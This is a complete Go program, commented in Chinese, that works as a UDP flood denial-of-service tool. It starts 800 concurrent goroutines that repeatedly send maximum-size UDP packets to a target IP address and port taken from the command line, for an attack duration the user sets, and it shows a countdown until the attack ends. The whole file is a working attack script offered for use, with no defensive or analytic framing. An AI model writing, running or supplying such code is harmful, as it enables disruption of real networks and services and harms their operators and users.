package main

import (
    "fmt"
    "net"
    "os"
    "strconv"
    "sync"
    "time"
)

const THREADS = 800

func attack(ip string, port int, duration int, wg *sync.WaitGroup) {
    defer wg.Done() // 确保goroutine完成时标记

    bytes := make([]byte, 65507) // 最大字节，只创建一次
    startTime := time.Now()
    endTime := startTime.Add(time.Duration(duration) * time.Second)

    for time.Now().Before(endTime) {
        conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", ip, port))
        if err != nil {
            fmt.Printf("连接错误: %v\n", err)
            continue // 发生错误时跳过当前循环
        }
        _, err = conn.Write(bytes)
        if err != nil {
            fmt.Printf("发送错误: %v\n", err)
        }
        conn.Close()
        time.Sleep(1 * time.Millisecond)
    }
}

func countdown(remainingTime int) {
    ticker := time.NewTicker(1 * time.Second)
    defer ticker.Stop()
    for i := remainingTime; i > 0; i-- {
        fmt.Printf("\r剩余结束时间: %d秒", i)
        <-ticker.C
    }
    fmt.Print("\r线程结束   \n")
}

func main() {
    if len(os.Args) < 4 {
        fmt.Println("请准确输入参数: 例 go run main.go <IP地址> <端口> <攻击持续时间>")
        os.Exit(1)
    }

    ip := os.Args[1]
    port, err := strconv.Atoi(os.Args[2])
    if err != nil {
        fmt.Println("端口参数错误")
        os.Exit(1)
    }
    attackDuration, err := strconv.Atoi(os.Args[3])
    if err != nil {
        fmt.Println("时间参数错误")
        os.Exit(1)
    }

    var wg sync.WaitGroup
    for i := 0; i < THREADS; i++ {
        wg.Add(1)
        go attack(ip, port, attackDuration, &wg)
    }

    go countdown(attackDuration)
    wg.Wait() // 等待所有攻击线程完成
}
